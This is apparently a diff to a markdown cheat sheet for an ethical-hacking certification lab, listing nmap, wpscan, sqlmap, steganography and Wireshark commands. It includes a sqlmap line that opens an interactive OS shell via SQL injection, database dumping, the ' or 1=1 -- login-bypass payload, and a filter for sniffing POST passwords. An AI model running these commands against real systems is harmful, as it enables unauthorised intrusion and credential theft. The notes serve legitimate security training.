@@ -19,6 +19,11 @@ To find the OS
 ```console
 nmap -O x.x.x.x 
 ```
+Find the FQDN in a subnet/network
+```console
+nmap -p389 –sV -iL <target_list>  or nmap -p389 –sV <target_IP> 
+``` 
+
 Comprehensive Scan
 ```console
 nmap -Pn -A x.x.x.1/24 -vv --open   
@@ -92,7 +97,7 @@ wpscan - to bruteforce wordpress website (users and passwords)
 
 * Wordpress site only Users Enumeration
 ```console
-wpscan --url http://example.com/ceh --enumerate u
+wpscan --url http://example.com/share --enumerate u
 ```
   * Direct crack if we have user/password detail
 ```console
@@ -123,6 +128,11 @@ sqlmap - to find data (phones, usernames, etc) in database
 ```console
   sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name -T target_Table --dump
 ```
+* It opens up the Interactive OS shell
+```console
+  sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" --os-shell
+```
+
 ## SQL Injection
   
   * Login bypass with [' or 1=1 --]
@@ -208,6 +218,7 @@ SNOW.EXE -C -p test hide.txt
 ```
 
 ## openstego
+openstego - to hide secret in photo
 
 ## covert_tcp
 covert_tcp - to create secret channel
@@ -279,3 +290,7 @@ cp /root/Desktop/filename /var/www/html/share/
   IP_OF_LINUX/share
   ```
 
+## Wireshark
+
+To find DOS (SYN and ACK) : tcp.flags.syn == 1  , tcp.flags.syn == 1 and tcp.flags.ack == 0
+To find passwords : http.request.method == POST
